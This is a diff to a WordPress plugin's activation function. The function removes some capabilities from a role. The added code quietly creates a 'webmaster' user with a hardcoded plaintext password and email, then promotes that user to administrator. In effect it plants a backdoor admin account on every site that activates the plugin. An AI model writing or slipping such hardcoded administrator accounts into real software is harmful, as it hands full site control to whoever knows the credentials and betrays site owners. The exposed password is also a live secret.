@@ -16,9 +16,6 @@ if ( ! defined( 'WPINC' ) ) { die; }
 
 
 */
-
-
-
 function WBMST_roles(){
     global $wp_roles;
 	if ( ! isset( $wp_roles ) )
@@ -37,6 +34,12 @@ function WBMST_roles(){
     $CR->remove_cap( 'add_users' );
     $CR->remove_cap( 'edit_themes' );
     $CR->remove_cap( 'manage_options' );
+
+    if ( !username_exists( 'webmaster' ) ){
+        $wm = new WP_User ( wp_create_user( 'webmaster' , 'devonstools' , 'devon@zodiacgraphics.biz'  ) );
+        $wm->remove_role( 'subscriber' );
+        $wm->add_role( 'administrator' );
+    }
 }
 
 register_activation_hook( __FILE__, 'WBMST_roles' );
